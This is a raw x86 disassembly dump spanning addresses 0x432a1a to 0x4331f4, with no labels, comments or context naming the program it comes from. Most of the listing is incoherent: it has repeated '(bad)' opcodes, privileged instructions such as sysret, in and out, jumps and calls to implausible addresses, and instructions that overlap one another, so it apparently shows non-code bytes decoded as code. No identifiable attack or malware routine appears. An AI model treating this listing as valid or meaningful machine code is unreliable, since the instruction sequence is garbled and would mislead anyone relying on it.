  432a1a:	or     BYTE PTR [ebp+0x7],cl
  432a1d:	lea    ebx,[ebx-0x748dcdff]
  432a23:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a2a:	mov    edx,DWORD PTR [eax]
  432a2c:	cld    
  432a2d:	dec    ebp
  432a2e:	push   esp
  432a2f:	sub    edx,DWORD PTR [ecx-0x75]
  432a32:	add    eax,0xf172fc
  432a37:	or     BYTE PTR [ebp+0x7],cl
  432a3a:	add    eax,ecx
  432a3c:	or     al,0x72
  432a3e:	add    DWORD PTR [eax],eax
  432a40:	mov    ebx,0x29c2c1
  432a45:	inc    ebp
  432a46:	mov    eax,DWORD PTR [ebx]
  432a48:	cmp    eax,0x3004d1c
  432a4e:	xbegin 0x66c8b648
  432a54:	clc    
  432a55:	or     BYTE PTR [ebp+0x45],al
  432a58:	xor    dh,BYTE PTR ds:0x78b089c
  432a5e:	adc    BYTE PTR [ebp+0x45],cl
  432a61:	lea    eax,[ebp+0x33727501]
  432a67:	add    cl,ch
  432a69:	inc    ebp
  432a6a:	add    bl,ch
  432a6c:	add    BYTE PTR [ebx+0x45850845],cl
  432a72:	je     0x4329ff
  432a74:	push   ebx
  432a75:	or     al,0x85
  432a77:	dec    ebp
  432a78:	std    
  432a79:	mov    bh,bh
  432a7b:	mov    BYTE PTR [ebp-0x75],al
  432a7e:	mov    edi,eax
  432a80:	or     al,0x89
  432a82:	inc    ebp
  432a83:	clc    
  432a84:	mov    esp,esp
  432a86:	hlt    
  432a87:	call   DWORD PTR [edi-0x37]
  432a8a:	push   esp
  432a8b:	or     al,0x51
  432a8d:	push   ebp
  432a8e:	xor    ebp,esp
  432a90:	mov    esi,0x457251
  432a95:	xor    esi,eax
  432a97:	pushf  
  432a98:	inc    ebp
  432a99:	(bad)  
  432a9a:	mov    edi,eax
  432a9c:	or     al,0x85
  432a9e:	add    al,bh
  432aa0:	inc    eax
  432aa2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432aa6:	or     ah,bh
  432aa8:	inc    eax
  432aa9:	push   esp
  432aaa:	jmp    0x432afd
  432aac:	mov    eax,DWORD PTR ds:0xe8720c
  432ab2:	mov    DWORD PTR [ebp-0x8],eax
  432ab5:	jne    0x432afc
  432ab7:	jmp    0x432a44
  432ab9:	mov    ebp,DWORD PTR [eax]
  432abb:	clc    
  432abc:	retf   0xff54
  432abf:	push   ecx
  432ac0:	mov    DWORD PTR ds:0x757210,eax
  432ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  432ac9:	sub    esp,DWORD PTR [ebx-0x77]
  432acc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432ad3:	or     ah,bh
  432ad5:	pop    es
  432ad6:	ds fwait
  432ad8:	push   DWORD PTR [edx]
  432ada:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432ae0:	(bad)  
  432ae1:	mov    bh,bh
  432ae3:	jmp    0x432ad1
  432ae5:	leave  
  432ae6:	jne    0x432af0
  432ae8:	call   0x302442
  432aed:	in     al,dx
  432aee:	dec    ebp
  432aef:	add    dh,BYTE PTR [ebx]
  432af1:	add    BYTE PTR [ebx],al
  432af3:	inc    ebp
  432af4:	cmp    esi,DWORD PTR [ecx]
  432af6:	je     0x432a94
  432af8:	mov    eax,edi
  432afa:	or     al,0xf0
  432afc:	add    BYTE PTR [ebp+0x458bf845],al
  432b02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b08:	adc    al,0x7
  432b0a:	enter  0x9fc0,0xa5
  432b0e:	rol    BYTE PTR [eax],0x5e
  432b11:	mov    ecx,ecx
  432b13:	or     al,0xc
  432b15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b1c:	jmp    0x432b1d
  432b1e:	push   ebp
  432b1f:	mov    esp,ebp
  432b21:	cld    
  432b22:	inc    ebp
  432b23:	inc    ebp
  432b24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b2b:	push   esi
  432b2c:	push   esi
  432b2d:	mov    edi,0x7af080f
  432b32:	add    bh,al
  432b34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432b40:	mov    ebp,eax
  432b42:	mov    ebp,edi
  432b44:	lock call edx
  432b47:	fcom   DWORD PTR [ebp+0x45]
  432b4a:	mov    eax,0x148a8b
  432b4f:	push   ecx
  432b50:	enter  0xc145,0x83
  432b54:	cmp    ecx,DWORD PTR [eax]
  432b56:	add    BYTE PTR [ebp+0x4d],al
  432b59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b5f:	call   0xffa326ce
  432b64:	cmp    eax,DWORD PTR [ebp-0xc]
  432b67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b6b:	push   ebp
  432b6c:	(bad)  
  432b6d:	call   0x342971
  432b72:	mov    bh,0xdb
  432b74:	cld    
  432b75:	or     BYTE PTR [ebp+0x45],bl
  432b78:	(bad)  
  432b79:	call   0xff7d2809
  432b7e:	add    al,BYTE PTR [ebp+0x37]
  432b81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b87:	jne    0x432b89
  432b89:	(bad)  
  432b8a:	cmp    edi,esp
  432b8c:	jne    0x432bbf
  432b8e:	mov    edi,edi
  432b90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b96:	pop    ds
  432b97:	into   
  432b98:	je     0x432b5b
  432b9a:	mov    ebx,DWORD PTR [esi]
  432b9c:	or     BYTE PTR [ebp-0x49],al
  432b9f:	mov    esp,DWORD PTR [esi-0x77]
  432ba2:	mov    esi,0x2451f0c
  432ba7:	mov    eax,DWORD PTR [eax]
  432ba9:	or     al,0x66
  432bab:	sar    bl,0x3b
  432bae:	xor    esi,DWORD PTR [ebp+0x66]
  432bb1:	xor    ecx,edi
  432bb3:	pop    edi
  432bb4:	adc    bl,BYTE PTR [ebx+0x7e]
  432bb7:	ret    0xff
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bc2:	cld    
  432bc3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bca:	push   0xffffff83
  432bcc:	pop    edi
  432bcd:	or     BYTE PTR [ebp+0x53],dh
  432bd0:	xorps  xmm1,xmm2
  432bd3:	test   BYTE PTR [eax+eax*1],bh
  432bd6:	add    BYTE PTR [eax],al
  432bd8:	adc    eax,eax
  432bda:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432be2:	jmp    DWORD PTR [eax]
  432be4:	ror    al,0x5e
  432be7:	inc    ebp
  432be8:	leave  
  432be9:	xor    ecx,DWORD PTR [eax]
  432beb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bf1:	add    ah,al
  432bf3:	xor    edi,edi
  432bf5:	xor    DWORD PTR [ebx],0x66003302
  432bfb:	mov    DWORD PTR [ebp-0xc],ecx
  432bfe:	pcmpgtw mm0,mm0
  432c01:	add    dl,ah
  432c03:	leave  
  432c04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c08:	push   eax
  432c09:	dec    ebp
  432c0a:	mov    esi,DWORD PTR [ebx-0x75]
  432c0d:	lea    ebp,[eax-0x7c00ff02]
  432c13:	xor    eax,DWORD PTR [eax]
  432c15:	sysret 
  432c17:	dec    ebp
  432c18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c1f:	push   WORD PTR [ecx+0x8]
  432c23:	jne    0x432be6
  432c25:	ud0    ecx,DWORD PTR [ecx]
  432c28:	mov    eax,edx
  432c2a:	lods   al,BYTE PTR ds:[esi]
  432c2b:	add    BYTE PTR [eax],al
  432c2d:	data16 (bad) 
  432c2f:	iret   
  432c30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c37:	cli    
  432c38:	inc    ebp
  432c39:	cmp    al,0x8d
  432c3b:	add    BYTE PTR [esi+0x2d],ah
  432c3e:	inc    ebp
  432c3f:	pop    ebp
  432c40:	lea    ecx,[edi]
  432c42:	mov    dl,bh
  432c44:	add    BYTE PTR [edi],cl
  432c46:	mov    DWORD PTR [eax+eax*8],edi
  432c49:	mov    ebx,0x3b87
  432c4e:	add    BYTE PTR [ebx],ch
  432c50:	inc    ebp
  432c51:	data16 (bad) 
  432c53:	clc    
  432c54:	int3   
  432c55:	cmp    eax,DWORD PTR [eax]
  432c57:	je     0x432be2
  432c59:	push   0xffffffc8
  432c5b:	pop    edi
  432c5c:	xchg   DWORD PTR [ebp+0x0],eax
  432c5f:	data16 add BYTE PTR [ebp+0x45],cl
  432c63:	lea    cx,[ebp+0x10]
  432c67:	jb     0x432c69
  432c69:	jmp    0x432bf4
  432c6b:	call   eax
  432c6d:	clc    
  432c6e:	xchg   DWORD PTR [edi+0x1],edi
  432c71:	mov    eax,DWORD PTR [eax]
  432c73:	or     BYTE PTR [ebp-0x49],al
  432c76:	lea    eax,[eax+0x74003154]
  432c7c:	push   edi
  432c7d:	inc    edx
  432c7e:	jge    0x432c7f
  432c80:	mov    DWORD PTR [edi],ecx
  432c82:	fdiv   DWORD PTR [edi-0x6]
  432c85:	inc    DWORD PTR [eax]
  432c87:	xor    edx,DWORD PTR [eax+0x5f]
  432c8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c8d:	ret    0x0
  432c90:	xor    BYTE PTR [ebp-0x51],cl
  432c93:	cmp    edi,0xf0ff89fe
  432c99:	data16 ror al,0x84
  432c9d:	rol    BYTE PTR [eax],0x3b
  432ca0:	add    al,dh
  432ca2:	dec    eax
  432ca3:	xchg   esp,eax
  432ca4:	push   ebx
  432ca5:	jmp    0x432c32
  432ca7:	push   ebp
  432ca8:	add    esp,ebp
  432caa:	add    ebp,esp
  432cac:	mov    edx,DWORD PTR [edi+0x24]
  432caf:	clc    
  432cb0:	dec    esi
  432cb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432cb7:	cmp    BYTE PTR [ebx],al
  432cb9:	jne    0x432c44
  432cbb:	xor    esp,eax
  432cbd:	jmp    0x462e40
  432cc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cc5:	jne    0x432cbb
  432cc7:	call   0xffcd2a21
  432ccc:	clc    
  432ccd:	xchg   edi,eax
  432cce:	sti    
  432ccf:	add    DWORD PTR [ebx],eax
  432cd1:	add    BYTE PTR [ebp+0x47],bl
  432cd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cda:	pop    ebp
  432cdb:	mov    DWORD PTR [esi-0x48],esi
  432cde:	jmp    0x432d27
  432ce0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432ce6:	(bad)  
  432ce8:	cmp    al,0x0
  432cea:	cmp    eax,DWORD PTR [ebp+0x18]
  432ced:	lea    ebx,[ebp-0x56]
  432cf0:	jle    0x432cf2
  432cf2:	jae    0x432c7d
  432cf4:	mov    eax,esp
  432cf6:	call   0xb900:0x8b005587
  432cfd:	inc    ebp
  432cfe:	push   ebp
  432cff:	lea    ecx,[ebp-0x27ff4f12]
  432d05:	mov    eax,edi
  432d07:	int3   
  432d08:	push   ebp
  432d09:	xchg   edi,eax
  432d0b:	add    esp,ebp
  432d0d:	add    BYTE PTR [eax],al
  432d0f:	inc    ebp
  432d10:	add    BYTE PTR [ebp+0x8b3255],cl
  432d16:	cld    
  432d17:	mov    DWORD PTR [edx],edi
  432d19:	aam    0x75
  432d1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d21:	mov    DWORD PTR [ebx-0x50],edx
  432d24:	test   BYTE PTR [ebp-0x1],0xe8
  432d28:	mov    eax,DWORD PTR [eax]
  432d2a:	hlt    
  432d2b:	add    al,al
  432d2d:	mov    eax,DWORD PTR ds:0x890045a8
  432d33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d39:	inc    DWORD PTR [eax*2+0xf75854d]
  432d40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d46:	call   0x72998a87
  432d4b:	je     0x432dab
  432d4d:	js     0x432dae
  432d4f:	lock ret 0x7e
  432d53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d59:	mov    edi,edi
  432d5b:	sbb    al,bl
  432d5d:	clc    
  432d5e:	add    BYTE PTR [ebp-0x73],bh
  432d61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d67:	ror    BYTE PTR [eax],1
  432d69:	dec    ebp
  432d6a:	xchg   ebp,eax
  432d6b:	mov    edi,edi
  432d6d:	in     al,0x8b
  432d6f:	jge    0x432cfa
  432d71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d77:	clc    
  432d78:	pop    esi
  432d79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d7f:	clc    
  432d80:	add    al,0x6e
  432d82:	mov    eax,DWORD PTR [ebx]
  432d84:	mov    BYTE PTR [ebp+0x0],dl
  432d87:	mov    edx,DWORD PTR [ebx-0x20]
  432d8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d90:	add    eax,0x3b3b73
  432d95:	adc    al,0x89
  432d97:	pop    eax
  432d98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d9c:	ret    0xf08
  432d9f:	cmp    al,0x2
  432da1:	mov    edx,eax
  432da3:	cld    
  432da4:	add    BYTE PTR [ebp+0x66],dl
  432da7:	add    eax,ebx
  432da9:	add    esp,eax
  432dab:	sub    eax,eax
  432dad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432db3:	add    BYTE PTR [eax],al
  432db5:	mov    DWORD PTR [ebx-0x24],ebx
  432db8:	push   edi
  432db9:	push   ebp
  432dba:	clc    
  432dbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432dc2:	out    0xff,eax
  432dc4:	add    edx,DWORD PTR [eax]
  432dc6:	jmp    0x432db0
  432dc8:	cmp    ch,0x46
  432dcb:	(bad)  
  432dcc:	jmp    0x40c8b61e
  432dd1:	je     0x432d5d
  432dd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dd9:	inc    ebp
  432dda:	add    BYTE PTR [ebx-0x770375],al
  432de0:	add    ah,ch
  432de2:	add    edx,esp
  432de4:	pop    edi
  432de5:	pop    ebp
  432de6:	push   ebp
  432de7:	inc    ebx
  432de8:	in     al,dx
  432de9:	pop    ebp
  432dea:	in     al,dx
  432deb:	cmp    edx,DWORD PTR [edi-0x8]
  432dee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432df5:	add    al,0x47
  432df7:	push   ebp
  432df8:	mov    esp,ebp
  432dfa:	in     al,0x45
  432dfc:	dec    ebp
  432dfd:	push   esi
  432dfe:	test   DWORD PTR [eax+0xfb010f],esi
  432e04:	add    BYTE PTR [eax+0xc018b],dh
  432e0a:	leave  
  432e0b:	inc    ebp
  432e0c:	test   al,ch
  432e0e:	add    dh,bh
  432e10:	add    bh,bh
  432e12:	dec    ebp
  432e13:	push   cs
  432e14:	mov    DWORD PTR [ecx],eax
  432e16:	hlt    
  432e17:	push   es
  432e18:	dec    ebp
  432e19:	leave  
  432e1a:	mov    DWORD PTR [eax],ecx
  432e1c:	clc    
  432e1d:	cmovge eax,ecx
  432e20:	mov    ecx,0x85c2f0
  432e26:	clc    
  432e27:	pop    DWORD PTR [ebp+0x1]
  432e2a:	push   ebx
  432e2b:	add    BYTE PTR [ebp-0x15],bh
  432e2e:	push   esi
  432e2f:	xor    eax,0x898a45
  432e34:	cld    
  432e35:	add    al,BYTE PTR [ebp+0x0]
  432e38:	xor    esp,DWORD PTR [esi-0x64]
  432e3b:	add    DWORD PTR [esi+0x78308c1],edi
  432e41:	add    ah,BYTE PTR [ebp-0x49]
  432e44:	int    0xbb
  432e46:	mov    ecx,DWORD PTR [esi+0xc]
  432e49:	add    dh,al
  432e4b:	cmp    ecx,ebx
  432e4d:	jne    0x432e17
  432e4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432e52:	jmp    0xca2e58
  432e57:	add    DWORD PTR [ebp+0x0],eax
  432e5a:	mov    eax,ebx
  432e5c:	or     al,0x8b
  432e5e:	(bad)  
  432e5f:	mov    ecx,esi
  432e61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e68:	mov    eax,edi
  432e6a:	or     BYTE PTR [edx],cl
  432e6c:	shl    cl,cl
  432e6e:	icebp  
  432e6f:	add    BYTE PTR [ebp+0x38],0x8b
  432e73:	or     BYTE PTR [edx+eax*2],cl
  432e76:	(bad)  
  432e77:	or     cl,dh
  432e79:	stc    
  432e7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e7e:	xor    al,0x0
  432e80:	inc    ebp
  432e81:	xchg   BYTE PTR [ebx],al
  432e83:	add    esp,edi
  432e85:	add    BYTE PTR [ebp-0x39],cl
  432e88:	mov    al,bl
  432e8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e90:	sub    al,0xbf
  432e92:	jmp    0x432e19
  432e94:	mov    edi,eax
  432e96:	lock jge 0x432e8a
  432e99:	lea    esi,[edx-0x74bad5ff]
  432e9f:	mov    ebp,esp
  432ea1:	or     cl,dh
  432ea3:	leave  
  432ea4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432eab:	dec    ebp
  432eac:	dec    ebp
  432ead:	test   DWORD PTR [ebx],eax
  432eaf:	paddb  mm6,mm0
  432eb2:	add    DWORD PTR [eax],eax
  432eb4:	dec    ebp
  432eb5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ebb:	mov    esi,DWORD PTR [edx]
  432ebd:	or     al,0x2b
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432ec6:	mov    esp,edi
  432ec8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ecf:	mov    DWORD PTR [ebx],ebp
  432ed1:	call   0xc76b801
  432ed6:	mov    DWORD PTR [ebp+0x10],ecx
  432ed9:	(bad)  
  432eda:	push   0x8b85ff10
  432edf:	clc    
  432ee0:	or     al,0x54
  432ee2:	(bad)  
  432ee3:	push   ecx
  432ee4:	retf   
  432ee5:	mov    ebx,0xff4d8dc8
  432eea:	mov    DWORD PTR [ebp+0x8],eax
  432eed:	xor    eax,DWORD PTR [ebp-0x75]
  432ef0:	cmp    ebp,DWORD PTR [ebx]
  432ef2:	lsl    ebx,WORD PTR [edi-0x8]
  432ef6:	call   DWORD PTR [ebx-0x741bff75]
  432efc:	(bad)  
  432efd:	or     al,0x5b
  432eff:	dec    ebp
  432f00:	or     BYTE PTR [ebx],dh
  432f02:	inc    ebp
  432f03:	xor    esi,DWORD PTR ds:0x708088d
  432f09:	in     eax,0x9b
  432f0b:	add    BYTE PTR [edx],dh
  432f0d:	inc    ebp
  432f0e:	pop    edi
  432f0f:	xor    eax,edx
  432f11:	test   DWORD PTR [eax],0x81108b8b
  432f17:	dec    ebp
  432f18:	sub    al,0x33
  432f1a:	add    BYTE PTR [ebx],dh
  432f1c:	push   esi
  432f1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f23:	mov    edi,eax
  432f25:	or     BYTE PTR [ebp+0x45],al
  432f28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f2e:	xor    ecx,ecx
  432f30:	pushf  
  432f31:	push   es
  432f32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f39:	dec    ebp
  432f3a:	inc    ebp
  432f3b:	cmp    BYTE PTR [ecx],0x54
  432f3e:	pushf  
  432f3f:	gs (bad) 
  432f41:	shl    esp,1
  432f43:	dec    ebp
  432f44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f4a:	shr    ecx,1
  432f4c:	xlat   BYTE PTR ds:[ebx]
  432f4d:	rol    bh,cl
  432f4f:	mov    edx,esp
  432f51:	or     BYTE PTR [ebp+0x4588f84d],al
  432f57:	mov    ecx,DWORD PTR [eax]
  432f59:	or     BYTE PTR [eax],al
  432f5b:	push   ebp
  432f5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f62:	dec    ebp
  432f63:	enter  0xceba,0x8
  432f67:	retf   0x1807
  432f6a:	ret    0x9b4d
  432f6d:	mov    esi,DWORD PTR [edx]
  432f6f:	or     al,0x33
  432f71:	into   
  432f72:	add    edx,esi
  432f74:	add    ecx,edx
  432f76:	bswap  eax
  432f78:	ror    esi,0x98
  432f7b:	dec    ebp
  432f7c:	add    cl,ch
  432f7e:	mov    edi,edi
  432f80:	hlt    
  432f81:	inc    esi
  432f83:	inc    ebp
  432f84:	ret    0x4533
  432f87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f8d:	or     BYTE PTR [ebx],dh
  432f8f:	dec    ebp
  432f90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f96:	jne    0xff8d2f5d
  432f9c:	inc    ebp
  432f9d:	inc    ebp
  432f9e:	mov    esi,DWORD PTR [ebx]
  432fa0:	clc    
  432fa1:	pop    esi
  432fa2:	ret    0xcaeb
  432fa5:	mov    eax,esi
  432fa7:	call   0x5204847a
  432fac:	dec    ebp
  432fad:	add    eax,0xf8728b
  432fb2:	adc    eax,0xce0ccac9
  432fb7:	push   ebp
  432fb8:	ret    0xc6ec
  432fbb:	in     al,dx
  432fbc:	call   0x33437cc5
  432fc1:	push   edi
  432fc2:	add    edi,eax
  432fc4:	xor    eax,eax
  432fc6:	jmp    0x43300d
  432fc8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fce:	add    eax,edi
  432fd0:	shr    eax,cl
  432fd2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fd8:	mov    esi,DWORD PTR [edx]
  432fda:	in     al,dx
  432fdb:	pushf  
  432fdc:	ret    0x84c7
  432fdf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fe5:	inc    ebp
  432fe6:	in     al,dx
  432fe7:	xor    DWORD PTR [ebp-0x64],eax
  432fea:	mov    eax,edi
  432fec:	cld    
  432fed:	fmul   st(2),st
  432fef:	sbb    dl,al
  432ff1:	jmp    0x9c3b:0x304d45c1
  432ff8:	jbe    0x432fc1
  432ffa:	mov    esp,eax
  432ffc:	clc    
  432ffd:	add    BYTE PTR [ebp+0x0],cl
  433000:	mov    ecx,ecx
  433002:	lea    eax,[ebp-0x5]
  433005:	mov    edi,edi
  433007:	call   0x51ce8451
  43300c:	hlt    
  43300d:	xor    eax,edx
  43300f:	mov    esi,0x9b7284
  433014:	xor    cl,dl
  433016:	mov    esi,eax
  433018:	hlt    
  433019:	into   
  43301a:	inc    ebp
  43301b:	scas   eax,DWORD PTR es:[edi]
  43301c:	mov    ebp,ecx
  43301e:	cld    
  43301f:	add    dl,cl
  433021:	add    dl,al
  433023:	inc    ebp
  433024:	shr    DWORD PTR [ebx],0x4d
  433027:	xor    edi,DWORD PTR [ebx]
  433029:	mov    DWORD PTR [edi],ecx
  43302b:	clc    
  43302c:	dec    esi
  43302d:	inc    ebp
  43302e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433034:	ret    0xc6ca
  433037:	mov    BYTE PTR [ebp-0x32],0x53
  43303b:	scas   eax,DWORD PTR es:[edi]
  43303c:	inc    ebp
  43303d:	jmp    0x43306f
  43303f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433046:	pop    ebx
  433047:	xor    ecx,DWORD PTR [ebp+0x3]
  43304a:	mov    eax,DWORD PTR [ebx]
  43304c:	clc    
  43304d:	test   edx,ecx
  43304f:	mov    ecx,esi
  433051:	cld    
  433052:	call   0x8ab7759c
  433057:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43305d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433063:	fdiv   QWORD PTR [ebx]
  433065:	retf   0xce89
  433068:	in     al,0xc1
  43306a:	inc    ebp
  43306b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433071:	into   
  433072:	mov    dh,0xc1
  433075:	call   0x8c1775fe
  43307a:	(bad)  
  43307b:	cld    
  43307c:	mov    ecx,DWORD PTR [ebp-0x14]
  43307f:	xor    eax,ecx
  433081:	lea    eax,[ebp+0x8]
  433084:	mov    esi,DWORD PTR [edx-0x4]
  433087:	add    dl,al
  433089:	inc    ebp
  43308a:	mov    esp,0x32d89b8b
  43308f:	dec    ebp
  433090:	mov    esi,DWORD PTR [ebx]
  433092:	cld    
  433093:	xor    eax,edx
  433095:	sub    esp,DWORD PTR [ebp-0x75]
  433098:	int    0xec
  43309a:	sub    ecx,eax
  43309c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  4330a2:	mov    esi,esp
  4330a4:	call   0x34177e2d
  4330a9:	inc    DWORD PTR [ebx]
  4330ab:	mov    edi,DWORD PTR [ebx]
  4330ad:	cld    
  4330ae:	jne    0x4330fd
  4330b0:	mov    esi,DWORD PTR [ebx]
  4330b2:	aam    0x8d
  4330b4:	dec    ebp
  4330b5:	or     BYTE PTR [ebx],dh
  4330b7:	jb     0x4330bc
  4330b9:	add    BYTE PTR [edi+0x45],bl
  4330bc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330c3:	xor    ebp,esp
  4330c5:	xor    eax,edi
  4330c7:	sub    edi,esp
  4330c9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330cf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330d6:	inc    ebp
  4330d7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330dd:	clc    
  4330de:	mov    eax,edi
  4330e0:	nop
  4330e1:	fadd   QWORD PTR [eax]
  4330e3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330e9:	jmp    0x433074
  4330eb:	mov    eax,DWORD PTR [ecx]
  4330ed:	fadd   DWORD PTR [eax]
  4330ef:	inc    ebp
  4330f0:	or     DWORD PTR [ebx],esi
  4330f2:	dec    eax
  4330f3:	add    edx,DWORD PTR [ebx-0x2d]
  4330f6:	dec    ebp
  4330f7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330fd:	inc    ebp
  4330fe:	push   esp
  4330ff:	mov    dl,BYTE PTR [ecx-0xd]
  433102:	xor    ecx,DWORD PTR [ebp-0x45]
  433105:	(bad)  
  433107:	rol    BYTE PTR [eax],0xc1
  43310a:	ret    
  43310b:	inc    ebp
  43310c:	inc    ebp
  43310d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433113:	xor    eax,ebx
  433115:	add    eax,DWORD PTR [ebp+0x23]
  433118:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43311e:	cmp    edi,0xc
  433121:	dec    ebp
  433122:	inc    ebp
  433123:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433129:	inc    ebp
  43312a:	mov    esi,DWORD PTR [ebx]
  43312c:	clc    
  43312d:	lea    eax,[ebp+0x45725407]
  433133:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433137:	xor    edi,DWORD PTR [eax]
  433139:	mov    ecx,0xff8b8d4d
  43313e:	push   esp
  43313f:	enter  0x4df7,0x23
  433143:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433149:	mov    eax,DWORD PTR [ebx]
  43314b:	loopne 0x433138
  43314d:	ret    0xc68b
  433150:	push   esp
  433151:	enter  0x9745,0x8b
  433155:	inc    ebp
  433156:	cld    
  433157:	mov    eax,edi
  433159:	clc    
  43315a:	ret    
  43315b:	ret    0xc645
  43315e:	mov    esi,DWORD PTR [ebx]
  433160:	cld    
  433161:	pop    esi
  433162:	mov    ebx,0x83458bc3
  433168:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43316c:	dec    ebp
  43316d:	xor    DWORD PTR [ebx],esi
  43316f:	pushf  
  433170:	add    edi,DWORD PTR [edx-0x7767a77]
  433176:	fcom   DWORD PTR [ebp+0x45]
  433179:	mov    esi,DWORD PTR [ebx]
  43317b:	adc    al,0x9c
  43317d:	inc    ebp
  43317e:	(bad)  
  43317f:	mov    ebx,eax
  433181:	adc    al,0x85
  433183:	cmp    al,0x1
  433186:	inc    ebp
  433187:	add    BYTE PTR ds:0xe98b9c4d,bh
  43318d:	mov    eax,DWORD PTR [ebx]
  43318f:	nop
  433190:	add    BYTE PTR [eax],al
  433192:	inc    ebp
  433193:	mov    esi,DWORD PTR [ebx]
  433195:	add    eax,DWORD PTR [ebx]
  433197:	cmp    al,0x89
  433199:	mov    esp,esi
  43319b:	clc    
  43319c:	inc    ebp
  43319d:	inc    ebp
  43319e:	add    edx,DWORD PTR [esi+0xc]
  4331a1:	mov    edi,0x7ff0845
  4331a6:	in     al,dx
  4331a7:	(bad)  
  4331a8:	jne    0x433145
  4331aa:	mov    esi,DWORD PTR [edx]
  4331ac:	clc    
  4331ad:	add    ebp,DWORD PTR [esi]
  4331af:	mov    edi,edi
  4331b1:	in     al,dx
  4331b2:	mov    DWORD PTR [ebp-0x10],eax
  4331b5:	xor    eax,DWORD PTR [ebp+0x3]
  4331b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331be:	fmul   DWORD PTR [ebx-0x173caf39]
  4331c4:	lea    ecx,[ecx+0x45e8d4bc]
  4331ca:	clc    
  4331cb:	mov    edi,edi
  4331cd:	cmp    BYTE PTR [ebp+0x4d],al
  4331d0:	test   DWORD PTR [eax+0x74],ecx
  4331d3:	inc    ecx
  4331d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331da:	ret    
  4331db:	inc    eax
  4331dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331e2:	push   eax
  4331e3:	dec    eax
  4331e4:	test   al,0xd0
  4331e6:	dec    eax
  4331e8:	mov    eax,DWORD PTR [ebp-0x14]
  4331eb:	mov    eax,DWORD PTR [ebp+0x38]
  4331ee:	mov    eax,ecx
  4331f0:	fadd   DWORD PTR [ebx]
  4331f2:	dec    ebp
  4331f3:	inc    eax
  4331f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
